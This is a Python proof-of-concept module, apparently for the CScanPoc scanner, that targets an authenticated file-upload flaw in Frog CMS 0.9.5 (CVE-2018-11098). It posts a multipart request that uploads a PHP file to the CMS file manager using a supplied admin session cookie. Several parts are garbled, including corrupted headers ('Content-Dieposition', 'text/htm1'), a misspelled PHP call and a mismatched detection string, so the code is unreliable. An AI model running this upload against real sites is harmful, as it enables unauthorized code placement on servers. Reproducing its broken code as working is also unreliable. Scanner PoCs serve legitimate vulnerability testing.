# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'CNVD-2018-10594_L'  # 平台漏洞编号
    name = 'Frog CMS系统文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '	2018-05-30'  # 漏洞公布时间
    desc = '''模版漏洞描述
    Frog CMS是软件开发者Philippe Archambault所研发的一套内容管理系统（CMS）。
    Frog CMS 0.9.5版本中存在安全漏洞。
    攻击者可借助admin/?/plugin/file_manager/upload URI利用该漏洞上传文件。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-10594'  # 漏洞来源
    cnvd_id = 'CNVD-2018-10594'  # cnvd漏洞编号
    cve_id = 'CVE-2018-11098'  # cve编号
    product = 'FrogCMS'  # 漏洞组件名称
    product_version = '0.9.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd3ed1bc2-5ded-4ef6-862b-b10109811e77'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-07-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookies': {
                    'type': 'string',
                    'description': '管理员登录后cookie值',
                    'default': 'PBPSESSiD=98ibualgoat8ih6hru9ftgv7fl'
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = self.target + "/FrogCMS/admin/?/plugin/file_manager/upload"
            headers = {
                "Content-Length": "405",
                "Cache-Control": "max-age=0",
                "upgrade-Insecure-Requests": "1",
                "Content-Type": "multipart/form-data;",
                "boundary": "----WebKitFormBoundarysbvd9Ar9CalxuTg4 ",
                "User-Agent": "Mozilla/5. 0 (Macintosh Intel MacOSX10134)Appleweb Kit/537.36 ( KEITML,likeGecko) Chrome/66.0.3339.I70 Safari/537.36",
                "Accept": "text/htm1application/×html+xml, application/xmlq=0.9, image/webp,image/apng,*/*q=0.8",
                "Accept-Encoding": "gzip,deflate",
                "Accept-Language": "zh-CN,zhq-0.9",
                "Cookie": self.get_option('cookies'),
                "Connection": "close"
            }
            data = '''------WebKitFormBoundarysbvd9Ar9CalxuTg4
Content-Dieposition:form-data; name=" upload[path]"
------WebKitFormBoundarysbvd9Ar9CalxuTg4
Content-Dieposition:form-data name="upload_file";filename="test.php"
Content-Type:text/php
<?php phpinfoo ?>
------WebKitFormBoundarysbvd9Ar9CalxuTg4
Content-Disposition:form-data;name="commit"
Upload
------WebKitFormBoundarysbvd9Ar9CalxuTg4--'''

            _response = requests.post(payload, data=data, headers=headers)
            if "./configure''--prefix==" in _response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
